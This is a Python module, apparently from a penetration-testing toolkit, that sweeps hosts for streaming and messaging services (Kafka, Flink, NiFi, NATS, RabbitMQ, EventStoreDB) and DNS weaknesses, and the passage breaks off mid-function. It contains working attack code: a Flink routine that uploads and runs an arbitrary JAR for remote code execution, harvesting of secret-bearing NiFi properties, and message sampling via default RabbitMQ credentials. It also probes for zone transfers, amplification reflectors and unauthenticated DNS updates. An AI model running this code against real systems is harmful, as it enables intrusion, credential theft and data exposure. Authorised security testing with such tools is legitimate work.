"""
Streaming pipeline attack surface enumeration.
Targets: Kafka (9092/9093), Flink (8081), NiFi (8080/8443),
         Confluent Schema Registry (8081), Apache NiFi Registry (18080).
"""

import socket
import struct
import json
import urllib.request
import urllib.error
import ssl
import io
from typing import Optional

# ─── Kafka ─────────────────────────────────────────────────────────────────

KAFKA_PORT = 9092
KAFKA_PLAINTEXT_PORT = 9092
KAFKA_SSL_PORT = 9093

def _kafka_encode_string(s: Optional[str]) -> bytes:
    if s is None:
        return struct.pack(">h", -1)
    enc = s.encode("utf-8")
    return struct.pack(">h", len(enc)) + enc

def _kafka_request(host: str, port: int, api_key: int, api_version: int,
                   body: bytes, timeout: int = 8) -> Optional[bytes]:
    """Send a raw Kafka protocol request and return the response payload."""
    client_id = b"\x00\x09" + b"ablation"  # int16 len + name
    correlation_id = 42
    header = struct.pack(">hhi", api_key, api_version, correlation_id) + client_id
    request = header + body
    length_prefixed = struct.pack(">i", len(request)) + request
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(length_prefixed)
        # Read 4-byte length prefix
        raw_len = b""
        while len(raw_len) < 4:
            chunk = s.recv(4 - len(raw_len))
            if not chunk:
                break
            raw_len += chunk
        if len(raw_len) < 4:
            s.close()
            return None
        resp_len = struct.unpack(">i", raw_len)[0]
        resp = b""
        while len(resp) < resp_len:
            chunk = s.recv(resp_len - len(resp))
            if not chunk:
                break
            resp += chunk
        s.close()
        return resp[4:]  # skip correlation_id
    except Exception:
        return None

def kafka_list_topics(host: str, port: int = KAFKA_PORT,
                      timeout: int = 8) -> dict:
    result = {"host": host, "port": port, "reachable": False,
              "topics": [], "error": None}
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        result["reachable"] = True
    except Exception:
        return result

    # Metadata request v0: list all topics (empty array = all)
    body = struct.pack(">i", 0)  # topics array length 0 = all topics
    resp = _kafka_request(host, port, api_key=3, api_version=0,
                          body=body, timeout=timeout)
    if resp is None:
        result["error"] = "no response to Metadata request"
        return result

    try:
        buf = io.BytesIO(resp)
        # Skip brokers array
        n_brokers = struct.unpack(">i", buf.read(4))[0]
        for _ in range(n_brokers):
            buf.read(4)  # node_id
            host_len = struct.unpack(">h", buf.read(2))[0]
            buf.read(host_len)  # host
            buf.read(4)  # port
        # Topics array
        n_topics = struct.unpack(">i", buf.read(4))[0]
        for _ in range(n_topics):
            buf.read(2)  # error_code
            name_len = struct.unpack(">h", buf.read(2))[0]
            if name_len > 0:
                name = buf.read(name_len).decode("utf-8", errors="replace")
                result["topics"].append(name)
    except Exception as e:
        result["error"] = f"parse error: {e}"

    return result

def kafka_consume_sample(host: str, topic: str, port: int = KAFKA_PORT,
                         timeout: int = 10, max_bytes: int = 65536) -> dict:
    """Fetch earliest message from topic partition 0 for data sampling."""
    result = {"topic": topic, "messages": [], "error": None}
    # FetchRequest v0 with FetchOffset=0
    replica_id = -1
    max_wait_ms = 500
    min_bytes = 1
    body = struct.pack(">iii", replica_id, max_wait_ms, min_bytes)
    # topics array: 1 topic, 1 partition
    topic_enc = _kafka_encode_string(topic)
    partition_data = struct.pack(">iqi", 0, 0, max_bytes)  # partition=0, offset=0
    body += struct.pack(">i", 1) + topic_enc + struct.pack(">i", 1) + partition_data
    resp = _kafka_request(host, port, api_key=1, api_version=0,
                          body=body, timeout=timeout)
    if resp is None:
        result["error"] = "no response"
        return result
    try:
        buf = io.BytesIO(resp)
        n_topics = struct.unpack(">i", buf.read(4))[0]
        for _ in range(n_topics):
            tname_len = struct.unpack(">h", buf.read(2))[0]
            buf.read(tname_len)
            n_parts = struct.unpack(">i", buf.read(4))[0]
            for _ in range(n_parts):
                buf.read(2 + 2 + 8 + 8 + 4)  # partition+error+hw+lo+msg_set_size
                # Try to read first message key+value
                buf.read(8 + 4 + 1 + 1)  # offset+msg_size+magic+attrs
                key_len = struct.unpack(">i", buf.read(4))[0]
                key = buf.read(max(0, key_len)) if key_len > 0 else b""
                val_len = struct.unpack(">i", buf.read(4))[0]
                val = buf.read(min(max(0, val_len), 2048)) if val_len > 0 else b""
                result["messages"].append({
                    "key": key.decode("utf-8", errors="replace"),
                    "value": val.decode("utf-8", errors="replace")
                })
    except Exception as e:
        result["error"] = f"parse: {e}"
    return result


# ─── Flink ─────────────────────────────────────────────────────────────────

FLINK_PORT = 8081

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _http_get(url: str, timeout: int = 8) -> Optional[dict]:
    try:
        req = urllib.request.Request(url)
        req.add_header("Accept", "application/json")
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code}
    except Exception:
        return None

def _http_post_file(url: str, filename: str, data: bytes,
                    timeout: int = 30) -> Optional[dict]:
    """Multipart POST for Flink JAR upload."""
    boundary = b"----AblationBoundary"
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="jarfile"; filename="' +
        filename.encode() + b'"\r\n'
        b"Content-Type: application/java-archive\r\n\r\n" +
        data + b"\r\n"
        b"--" + boundary + b"--\r\n"
    )
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type",
                   f"multipart/form-data; boundary={boundary.decode()}")
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code}
    except Exception:
        return None

def flink_enumerate(host: str, port: int = FLINK_PORT,
                    timeout: int = 8) -> dict:
    base = f"http://{host}:{port}"
    result = {"host": host, "port": port, "reachable": False,
              "overview": None, "jobs": [], "config": None,
              "jars": [], "taskmanagers": [], "jar_upload_open": False}
    try:
        socket.create_connection((host, port), timeout=timeout).close()
        result["reachable"] = True
    except Exception:
        return result

    result["overview"] = _http_get(f"{base}/overview", timeout=timeout)
    jobs_resp = _http_get(f"{base}/jobs", timeout=timeout)
    if jobs_resp and "jobs" in jobs_resp:
        result["jobs"] = jobs_resp["jobs"]
    result["config"] = _http_get(f"{base}/jobmanager/config", timeout=timeout)
    jars_resp = _http_get(f"{base}/jars", timeout=timeout)
    if jars_resp and "files" in jars_resp:
        result["jars"] = jars_resp["files"]
    tm_resp = _http_get(f"{base}/taskmanagers", timeout=timeout)
    if tm_resp and "taskmanagers" in tm_resp:
        result["taskmanagers"] = tm_resp["taskmanagers"]

    # Test JAR upload endpoint (don't actually upload — just probe OPTIONS)
    try:
        req = urllib.request.Request(f"{base}/jars/upload", method="OPTIONS")
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout):
            result["jar_upload_open"] = True
    except urllib.error.HTTPError as e:
        # 400/415 means endpoint exists, auth not required
        result["jar_upload_open"] = e.code in (400, 405, 415)
    except Exception:
        pass

    return result

def flink_submit_jar_rce(host: str, jar_bytes: bytes,
                         entry_class: str, port: int = FLINK_PORT,
                         timeout: int = 30) -> dict:
    """Upload and run arbitrary JAR on Flink cluster (RCE)."""
    base = f"http://{host}:{port}"
    result = {"jar_id": None, "run_response": None, "error": None}
    upload = _http_post_file(f"{base}/jars/upload", "payload.jar",
                             jar_bytes, timeout=timeout)
    if not upload or "__http_error" in upload:
        result["error"] = f"upload failed: {upload}"
        return result
    jar_id = upload.get("filename", "").split("/")[-1]
    result["jar_id"] = jar_id
    run_body = json.dumps({
        "entryClass": entry_class,
        "programArgs": "",
        "parallelism": 1
    }).encode()
    req = urllib.request.Request(
        f"{base}/jars/{jar_id}/run",
        data=run_body, method="POST"
    )
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            result["run_response"] = json.loads(r.read())
    except urllib.error.HTTPError as e:
        result["run_response"] = {"__http_error": e.code}
    except Exception as e:
        result["error"] = str(e)
    return result


# ─── NiFi ─────────────────────────────────────────────────────────────────

NIFI_HTTP_PORT = 8080
NIFI_HTTPS_PORT = 8443
NIFI_REGISTRY_PORT = 18080

def nifi_enumerate(host: str, timeout: int = 8) -> dict:
    result = {"host": host, "port": None, "reachable": False,
              "auth_required": True, "flow_status": None,
              "processors": [], "controller_services": [],
              "sensitive_props": [], "registry_clients": [],
              "nifi_version": None}

    # Try HTTPS first, then HTTP
    for port, scheme in [(NIFI_HTTPS_PORT, "https"), (NIFI_HTTP_PORT, "http")]:
        try:
            socket.create_connection((host, port), timeout=timeout).close()
            result["port"] = port
            result["reachable"] = True
            base = f"{scheme}://{host}:{port}/nifi-api"
            break
        except Exception:
            continue
    else:
        return result

    # Check auth status
    access = _http_get(f"{base}/access", timeout=timeout)
    if access:
        result["auth_required"] = access.get("status") not in ("ACTIVE", "")
        if access.get("identity"):
            result["auth_required"] = False  # already has access token

    flow = _http_get(f"{base}/flow/status", timeout=timeout)
    if flow and "__http_error" not in flow:
        result["flow_status"] = flow
        result["auth_required"] = False

    if not result["auth_required"]:
        # Enumerate processors
        procs = _http_get(f"{base}/flow/process-groups/root/processors",
                          timeout=timeout)
        if procs and "processors" in procs:
            for p in procs["processors"]:
                entry = {
                    "id": p.get("id"),
                    "name": p.get("component", {}).get("name"),
                    "type": p.get("component", {}).get("type"),
                }
                # Check for sensitive property patterns
                props = p.get("component", {}).get("config", {}).get("properties", {})
                sensitive = {k: v for k, v in (props or {}).items()
                             if any(s in k.lower() for s in
                                    ["password", "secret", "key", "token", "credential"])}
                if sensitive:
                    entry["sensitive_props"] = sensitive
                result["processors"].append(entry)

        # Controller services (often store creds)
        svc = _http_get(f"{base}/flow/process-groups/root/controller-services",
                        timeout=timeout)
        if svc and "controllerServices" in svc:
            for cs in svc["controllerServices"]:
                props = cs.get("component", {}).get("properties", {})
                sensitive = {k: v for k, v in (props or {}).items()
                             if any(s in k.lower() for s in
                                    ["password", "secret", "key", "token", "credential"])}
                result["controller_services"].append({
                    "name": cs.get("component", {}).get("name"),
                    "type": cs.get("component", {}).get("type"),
                    "sensitive_props": sensitive
                })

        # Registry clients (NiFi Registry connections — code/flow repos)
        reg = _http_get(f"{base}/controller/registry-clients", timeout=timeout)
        if reg and "registries" in reg:
            result["registry_clients"] = reg["registries"]

    return result


# ─── Confluent Schema Registry ──────────────────────────────────────────────

SCHEMA_REGISTRY_PORT = 8081

def schema_registry_enumerate(host: str, port: int = SCHEMA_REGISTRY_PORT,
                               timeout: int = 8) -> dict:
    base = f"http://{host}:{port}"
    result = {"host": host, "port": port, "reachable": False,
              "subjects": [], "config": None}
    try:
        socket.create_connection((host, port), timeout=timeout).close()
        result["reachable"] = True
    except Exception:
        return result

    subjects = _http_get(f"{base}/subjects", timeout=timeout)
    if isinstance(subjects, list):
        result["subjects"] = subjects

    result["config"] = _http_get(f"{base}/config", timeout=timeout)
    return result


# ─── Tetration ─────────────────────────────────────────────────────────────

TETRATION_KAFKA_PORT = 9093

def tetration_kafka_probe(host: str, port: int = TETRATION_KAFKA_PORT,
                          timeout: int = 8) -> dict:
    """Probe Tetration Kafka export (unauthenticated in default config)."""
    result = {"host": host, "port": port, "reachable": False,
              "topics": [], "note": None}
    try:
        socket.create_connection((host, port), timeout=timeout).close()
        result["reachable"] = True
    except Exception:
        return result
    # Attempt plaintext topic list (Tetration default = no auth)
    topics = kafka_list_topics(host, port=port, timeout=timeout)
    result["topics"] = topics.get("topics", [])
    if result["topics"]:
        result["note"] = "Tetration Kafka unauthenticated topic list successful"
    return result


# ─── EventStoreDB ──────────────────────────────────────────────────────────

EVENTSTORE_HTTP_PORT = 2113

def check_event_store_exposure(host: str, port: int = EVENTSTORE_HTTP_PORT,
                                timeout: int = 8) -> list:
    findings = []
    base = f"http://{host}:{port}"

    try:
        socket.create_connection((host, port), timeout=timeout).close()
    except Exception:
        return findings

    # /info - version disclosure
    info = _http_get(f"{base}/info", timeout=timeout)
    if info and "__http_error" not in info and isinstance(info, dict):
        findings.append({
            "severity": "LOW",
            "title": "EventStoreDB info endpoint exposed",
            "detail": f"version={info.get('esVersion', info.get('version', 'unknown'))}",
            "host": host,
            "port": port,
        })

    # /streams - list all streams
    streams_resp = _http_get(f"{base}/streams", timeout=timeout)
    if streams_resp and "__http_error" not in streams_resp:
        findings.append({
            "severity": "HIGH",
            "title": "EventStoreDB stream index unauth read",
            "detail": "GET /streams returned data without authentication",
            "host": host,
            "port": port,
        })

    # /streams/$all - all events across every stream
    all_stream = _http_get(f"{base}/streams/%24all", timeout=timeout)
    if all_stream and "__http_error" not in all_stream:
        findings.append({
            "severity": "CRITICAL",
            "title": "EventStoreDB $all stream unauth read",
            "detail": "GET /streams/$all returned full event log without authentication; "
                      "complete audit trail of all aggregate mutations is readable",
            "host": host,
            "port": port,
        })

    return findings


# ─── NATS ──────────────────────────────────────────────────────────────────

NATS_CLIENT_PORT  = 4222
NATS_MONITOR_PORT = 8222
NATS_CLUSTER_PORT = 6222

def check_nats_exposure(host: str, port: int = NATS_CLIENT_PORT,
                         timeout: int = 8) -> list:
    findings = []

    # TCP client port - NATS sends INFO banner on connect
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        banner = b""
        try:
            while b"\r\n" not in banner and len(banner) < 4096:
                chunk = s.recv(1024)
                if not chunk:
                    break
                banner += chunk
        except Exception:
            pass
        s.close()
        line = banner.split(b"\r\n")[0]
        if line.startswith(b"INFO "):
            raw_json = line[5:].strip()
            try:
                info = json.loads(raw_json)
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NATS server client port exposed",
                    "detail": (
                        f"version={info.get('version', 'unknown')} "
                        f"server_id={info.get('server_id', '')} "
                        f"proto={info.get('proto', '')} "
                        f"jetstream={info.get('jetstream', False)}"
                    ),
                    "host": host,
                    "port": port,
                })
            except Exception:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NATS server client port exposed",
                    "detail": "INFO banner received; JSON parse failed",
                    "host": host,
                    "port": port,
                })
    except Exception:
        pass

    # HTTP monitoring port
    mon_base = f"http://{host}:{NATS_MONITOR_PORT}"
    try:
        socket.create_connection((host, NATS_MONITOR_PORT), timeout=timeout).close()
        mon_reachable = True
    except Exception:
        mon_reachable = False

    if mon_reachable:
        varz = _http_get(f"{mon_base}/varz", timeout=timeout)
        if varz and "__http_error" not in varz and isinstance(varz, dict):
            findings.append({
                "severity": "HIGH",
                "title": "NATS monitoring API /varz unauth",
                "detail": (
                    f"server={varz.get('server_name', varz.get('server_id', ''))} "
                    f"version={varz.get('version', '')} "
                    f"connections={varz.get('connections', '')} "
                    f"mem={varz.get('mem', '')}"
                ),
                "host": host,
                "port": NATS_MONITOR_PORT,
            })

        subsz = _http_get(f"{mon_base}/subsz", timeout=timeout)
        if subsz and "__http_error" not in subsz and isinstance(subsz, dict):
            findings.append({
                "severity": "HIGH",
                "title": "NATS monitoring API /subsz unauth - subscriber enumeration",
                "detail": (
                    f"num_subscriptions={subsz.get('num_subscriptions', '')} "
                    f"subjects exposed in subscriber list"
                ),
                "host": host,
                "port": NATS_MONITOR_PORT,
            })

        connz = _http_get(f"{mon_base}/connz", timeout=timeout)
        if connz and "__http_error" not in connz and isinstance(connz, dict):
            num_conns = connz.get("num_connections", "")
            findings.append({
                "severity": "HIGH",
                "title": "NATS monitoring API /connz unauth - client connection list",
                "detail": (
                    f"num_connections={num_conns}; "
                    "client IPs, subject subscriptions, and RTT visible"
                ),
                "host": host,
                "port": NATS_MONITOR_PORT,
            })

    return findings


# ─── Dead Letter Queues ─────────────────────────────────────────────────────

RABBITMQ_MGMT_PORT = 15672

def _rabbitmq_get(url: str, username: str = "guest", password: str = "guest",
                  timeout: int = 8) -> Optional[dict]:
    import base64
    token = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Basic {token}")
        req.add_header("Accept", "application/json")
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code}
    except Exception:
        return None

def _rabbitmq_post(url: str, payload: dict, username: str = "guest",
                   password: str = "guest", timeout: int = 8) -> Optional[dict]:
    import base64
    token = base64.b64encode(f"{username}:{password}".encode()).decode()
    body = json.dumps(payload).encode()
    try:
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Authorization", f"Basic {token}")
        req.add_header("Content-Type", "application/json")
        req.add_header("Accept", "application/json")
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code}
    except Exception:
        return None

def check_dead_letter_queue(host: str, timeout: int = 8,
                             username: str = "guest",
                             password: str = "guest") -> list:
    findings = []
    base = f"http://{host}:{RABBITMQ_MGMT_PORT}"

    try:
        socket.create_connection((host, RABBITMQ_MGMT_PORT), timeout=timeout).close()
    except Exception:
        return findings

    queues_resp = _rabbitmq_get(f"{base}/api/queues", username=username,
                                 password=password, timeout=timeout)
    if not queues_resp or "__http_error" in queues_resp:
        return findings

    if not isinstance(queues_resp, list):
        return findings

    dlq_markers = ("dead", "dlq", "dlx", "letter")
    dlqs = [
        q for q in queues_resp
        if any(m in q.get("name", "").lower() for m in dlq_markers)
    ]

    if dlqs:
        findings.append({
            "severity": "HIGH",
            "title": "RabbitMQ dead letter queues enumerated unauth",
            "detail": (
                f"{len(dlqs)} DLQ(s) visible: "
                + ", ".join(
                    f"{q.get('vhost','/')}/{q.get('name','')} "
                    f"(messages={q.get('messages', 0)})"
                    for q in dlqs[:10]
                )
            ),
            "host": host,
            "port": RABBITMQ_MGMT_PORT,
        })

        for q in dlqs:
            vhost = q.get("vhost", "/")
            qname = q.get("name", "")
            if not qname or q.get("messages", 0) == 0:
                continue
            import urllib.parse
            vhost_enc = urllib.parse.quote(vhost, safe="")
            qname_enc = urllib.parse.quote(qname, safe="")
            sample_url = f"{base}/api/queues/{vhost_enc}/{qname_enc}/get"
            sample = _rabbitmq_post(
                sample_url,
                {"count": 1, "requeue": True, "encoding": "auto"},
                username=username,
                password=password,
                timeout=timeout,
            )
            if sample and isinstance(sample, list) and len(sample) > 0:
                msg = sample[0]
                payload_preview = str(msg.get("payload", ""))[:256]
                findings.append({
                    "severity": "CRITICAL",
                    "title": "RabbitMQ DLQ message sampled unauth",
                    "detail": (
                        f"queue={vhost}/{qname} "
                        f"routing_key={msg.get('routing_key', '')} "
                        f"payload_preview={payload_preview!r}"
                    ),
                    "host": host,
                    "port": RABBITMQ_MGMT_PORT,
                })

    return findings


# ─── Single-host full sweep ────────────────────────────────────────────────

def enumerate_all(host: str, timeout: int = 8) -> dict:
    """
    Run all streaming/event-bus checks against a single host.
    Returns a dict keyed by service name, each value is the raw result
    or a findings list for the newer checks.
    """
    return {
        "kafka":            kafka_list_topics(host, timeout=timeout),
        "flink":            flink_enumerate(host, timeout=timeout),
        "nifi":             nifi_enumerate(host, timeout=timeout),
        "schema_registry":  schema_registry_enumerate(host, timeout=timeout),
        "tetration_kafka":  tetration_kafka_probe(host, timeout=timeout),
        "event_store":      check_event_store_exposure(host, timeout=timeout),
        "nats":             check_nats_exposure(host, timeout=timeout),
        "dead_letter":      check_dead_letter_queue(host, timeout=timeout),
    }


# ─── Top-level sweep ───────────────────────────────────────────────────────

def enumerate_streaming_surface(hosts: list, timeout: int = 8) -> dict:
    """
    Sweep a list of hosts for all streaming pipeline attack surfaces.
    Returns per-host per-service results.
    """
    results = {}
    for host in hosts:
        h = {
            "kafka": kafka_list_topics(host, timeout=timeout),
            "flink": flink_enumerate(host, timeout=timeout),
            "nifi": nifi_enumerate(host, timeout=timeout),
            "schema_registry": schema_registry_enumerate(host, timeout=timeout),
            "tetration_kafka": tetration_kafka_probe(host, timeout=timeout),
        }
        results[host] = h
    return results


# ─── DNS Infrastructure ────────────────────────────────────────────────────

DNS_PORT = 53
DNS_DOT_PORT = 853


def _dns_encode_name(name: str) -> bytes:
    """Encode a domain name as DNS wire-format labels."""
    if not name or name == ".":
        return b"\x00"
    encoded = b""
    for label in name.rstrip(".").split("."):
        lb = label.encode("ascii", errors="replace")
        encoded += bytes([len(lb)]) + lb
    return encoded + b"\x00"


def _dns_skip_name(data: bytes, offset: int) -> int:
    """Skip a DNS name at offset (handles compression), return new offset."""
    while offset < len(data):
        if data[offset] == 0:
            return offset + 1
        elif (data[offset] & 0xC0) == 0xC0:
            return offset + 2
        else:
            offset += 1 + data[offset]
    return offset


def _dns_query_msg(txid: int, flags: int, qname: str, qtype: int,
                   qclass: int = 1, additional: bytes = b"") -> bytes:
    """Build a DNS query message (wire format)."""
    arcount = 1 if additional else 0
    header = struct.pack(">HHHHHH", txid, flags, 1, 0, 0, arcount)
    question = _dns_encode_name(qname) + struct.pack(">HH", qtype, qclass)
    return header + question + additional


def _dns_tcp(host: str, port: int, msg: bytes, timeout: float) -> Optional[bytes]:
    """Send DNS query over TCP with 2-byte length prefix, return response payload."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(struct.pack(">H", len(msg)) + msg)
        raw = b""
        while len(raw) < 2:
            c = s.recv(2 - len(raw))
            if not c:
                break
            raw += c
        if len(raw) < 2:
            s.close()
            return None
        rlen = struct.unpack(">H", raw)[0]
        resp = b""
        while len(resp) < rlen:
            c = s.recv(min(4096, rlen - len(resp)))
            if not c:
                break
            resp += c
        s.close()
        return resp
    except Exception:
        return None


def _dns_udp(host: str, port: int, msg: bytes, timeout: float,
             bufsize: int = 65535) -> Optional[bytes]:
    """Send DNS query over UDP, return response."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(msg, (host, port))
        data, _ = s.recvfrom(bufsize)
        s.close()
        return data
    except Exception:
        return None


def _dns_rcode(resp: bytes) -> int:
    """Extract RCODE from DNS response (lower 4 bits of flags word)."""
    if len(resp) < 4:
        return -1
    return struct.unpack(">H", resp[2:4])[0] & 0x0F


def _dns_ancount(resp: bytes) -> int:
    """Extract ANCOUNT from DNS response header."""
    if len(resp) < 8:
        return 0
    return struct.unpack(">H", resp[6:8])[0]


def _dns_first_answer_rtype(resp: bytes) -> int:
    """Return RTYPE of the first answer RR, or -1 on parse failure."""
    try:
        if len(resp) < 12:
            return -1
        qdcount = struct.unpack(">H", resp[4:6])[0]
        offset = 12
        for _ in range(qdcount):
            offset = _dns_skip_name(resp, offset)
            offset += 4  # QTYPE + QCLASS
        offset = _dns_skip_name(resp, offset)
        if offset + 2 > len(resp):
            return -1
        return struct.unpack(">H", resp[offset:offset + 2])[0]
    except Exception:
        return -1


def _dns_extract_zone(host: str) -> str:
    """Best-effort zone derivation from host string."""
    parts = host.split(".")
    if all(p.isdigit() for p in parts) and len(parts) == 4:
        return ".".join(reversed(parts)) + ".in-addr.arpa"
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return host


def probe_dns_zone_transfer(host: str, port: int = 53,
                            timeout: float = 5.0) -> list:
    """
    Probe DNS server for AXFR/IXFR zone transfer exposure and UDP ANY amplification.
    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings = []
    zone = _dns_extract_zone(host)

    # AXFR (type=252) over TCP/53
    axfr_msg = _dns_query_msg(0xA001, 0x0000, zone, 252)
    resp = _dns_tcp(host, port, axfr_msg, timeout)
    if resp and len(resp) >= 12:
        ancount = _dns_ancount(resp)
        first_rtype = _dns_first_answer_rtype(resp)
        if ancount > 0:
            soa_present = first_rtype == 6  # SOA=6
            findings.append({
                "severity": "CRITICAL",
                "title": "DNS_AXFR_ALLOWED — full zone transfer",
                "detail": (
                    f"AXFR for zone={zone} returned {ancount} record(s); "
                    f"SOA_present={soa_present}; "
                    "full zone contents readable without authentication"
                ),
                "host": host,
                "port": port,
            })

    # IXFR (type=251) over TCP/53
    # Authority section carries a SOA RR with serial=0 to trigger IXFR
    soa_rdata = (
        _dns_encode_name("ns1." + zone) +
        _dns_encode_name("hostmaster." + zone) +
        struct.pack(">IIIII", 0, 3600, 900, 604800, 300)
    )
    soa_rr = (
        _dns_encode_name(zone) +
        struct.pack(">HHIH", 6, 1, 0, len(soa_rdata)) +
        soa_rdata
    )
    ixfr_header = struct.pack(">HHHHHH", 0xA002, 0x0000, 1, 0, 1, 0)
    ixfr_question = _dns_encode_name(zone) + struct.pack(">HH", 251, 1)
    ixfr_msg = ixfr_header + ixfr_question + soa_rr
    resp = _dns_tcp(host, port, ixfr_msg, timeout)
    if resp and len(resp) >= 12:
        ancount = _dns_ancount(resp)
        first_rtype = _dns_first_answer_rtype(resp)
        # Report IXFR only if AXFR was not already flagged
        if ancount > 0 and first_rtype == 6 and not findings:
            findings.append({
                "severity": "HIGH",
                "title": "DNS_IXFR_ALLOWED",
                "detail": (
                    f"IXFR for zone={zone} returned SOA; "
                    "incremental zone transfer accepted without authentication"
                ),
                "host": host,
                "port": port,
            })

    # UDP ANY (QTYPE=255) amplification check against a known domain
    any_msg = _dns_query_msg(0xA003, 0x0100, "google.com", 255)
    resp = _dns_udp(host, port, any_msg, timeout)
    if resp and len(resp) > 512:
        findings.append({
            "severity": "HIGH",
            "title": "DNS_ANY_AMPLIFICATION — reflector usable",
            "detail": (
                f"UDP ANY query for google.com returned {len(resp)} bytes "
                f"(>512); host is usable as DNS amplification reflector"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_dns_recursion(host: str, port: int = 53,
                        timeout: float = 5.0) -> list:
    """
    Probe for open recursion, EDNS0 amplification, source-port predictability,
    and BIND version disclosure via version.bind CHAOS query.
    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings = []

    # Open recursion: A query for external domain with RD=1
    # Flags 0x0100 = standard query, recursion desired
    rec_msg = _dns_query_msg(0xB001, 0x0100, "google.com", 1)
    resp = _dns_udp(host, port, rec_msg, timeout)
    if resp and len(resp) >= 4:
        resp_flags = struct.unpack(">H", resp[2:4])[0]
        ra = (resp_flags >> 7) & 1  # RA bit set = server offers recursion
        rcode = resp_flags & 0x0F
        ancount = _dns_ancount(resp)
        if ra == 1 and rcode == 0 and ancount > 0:
            findings.append({
                "severity": "HIGH",
                "title": "DNS_OPEN_RECURSION — amplification vector",
                "detail": (
                    f"RA=1, RCODE=NOERROR, ANCOUNT={ancount} for external query "
                    "google.com; open recursive resolver usable as amplification source"
                ),
                "host": host,
                "port": port,
            })

    # EDNS0 amplification: OPT record advertising 4096-byte UDP buffer
    # OPT RR wire: NAME=0x00 TYPE=41 CLASS=4096(UDP payload) TTL=0 RDLENGTH=0
    edns0_opt = b"\x00" + struct.pack(">HHIH", 41, 4096, 0, 0)
    edns_msg = _dns_query_msg(0xB002, 0x0100, "google.com", 1, additional=edns0_opt)
    resp = _dns_udp(host, port, edns_msg, timeout)
    if resp and len(resp) > 512:
        amp_factor = len(resp) // max(len(edns_msg), 1)
        findings.append({
            "severity": "HIGH",
            "title": "DNS_EDNS_AMPLIFICATION — 10x+ amplification factor",
            "detail": (
                f"EDNS0 query ({len(edns_msg)} bytes) returned {len(resp)} bytes; "
                f"~{amp_factor}x amplification factor"
            ),
            "host": host,
            "port": port,
        })

    # Source port 53 spoofing: bind local UDP/53 and send query
    # Tests whether firewall treats source-53 traffic as implicitly trusted
    try:
        sp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sp_sock.bind(("", 53))
        sp_sock.settimeout(timeout)
        q = _dns_query_msg(0xB003, 0x0100, "google.com", 1)
        sp_sock.sendto(q, (host, port))
        data, _ = sp_sock.recvfrom(65535)
        sp_sock.close()
        if data and len(data) >= 12:
            findings.append({
                "severity": "MEDIUM",
                "title": "DNS_SOURCE_PORT_PREDICTABLE",
                "detail": (
                    "DNS server responds to queries from source port 53; "
                    "firewall may implicitly trust spoofed DNS traffic"
                ),
                "host": host,
                "port": port,
            })
    except Exception:
        pass

    # version.bind: CHAOS class (3), TXT type (16)
    vb_msg = _dns_query_msg(0xB004, 0x0100, "version.bind", 16, 3)
    resp = _dns_udp(host, port, vb_msg, timeout)
    if resp and len(resp) >= 12:
        ancount = _dns_ancount(resp)
        rcode = _dns_rcode(resp)
        if ancount > 0 and rcode == 0:
            version_str = ""
            try:
                qdcount = struct.unpack(">H", resp[4:6])[0]
                offset = 12
                for _ in range(qdcount):
                    offset = _dns_skip_name(resp, offset)
                    offset += 4
                for _ in range(ancount):
                    offset = _dns_skip_name(resp, offset)
                    if offset + 10 > len(resp):
                        break
                    rtype, _rc, _ttl, rdlen = struct.unpack(">HHIH", resp[offset:offset + 10])
                    offset += 10
                    if rtype == 16 and rdlen >= 1:  # TXT
                        txt_len = resp[offset]
                        version_str = resp[offset + 1:offset + 1 + txt_len].decode(
                            "ascii", errors="replace")
                    offset += rdlen
            except Exception:
                pass
            findings.append({
                "severity": "MEDIUM",
                "title": "DNS_VERSION_DISCLOSED — CVE targeting",
                "detail": (
                    f"version.bind CHAOS/TXT query answered; "
                    f"BIND version={version_str!r}; enables precise CVE targeting"
                ),
                "host": host,
                "port": port,
            })

    return findings


def probe_ddns_abuse(host: str, port: int = 53,
                     timeout: float = 5.0) -> list:
    """
    Probe for unauthenticated Dynamic DNS UPDATE acceptance (RFC 2136).
    Sends a DNS UPDATE without TSIG authentication and checks RCODE.
    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings = []
    zone = _dns_extract_zone(host)
    update_name = "ablation-test." + zone

    # DNS UPDATE header (RFC 2136 section 2):
    #   opcode=5 (UPDATE), QR=0, all other flag bits 0
    #   Flags: 0_0101_0000_0000_0000 = 0x2800
    txid = 0xDEAD
    flags = 0x2800

    # Zone section (ZOCOUNT=1): SOA query identifies the zone
    zone_rr = _dns_encode_name(zone) + struct.pack(">HH", 6, 1)  # SOA=6, IN=1

    # Prerequisite section (PRCOUNT=1): ANY RRset exists
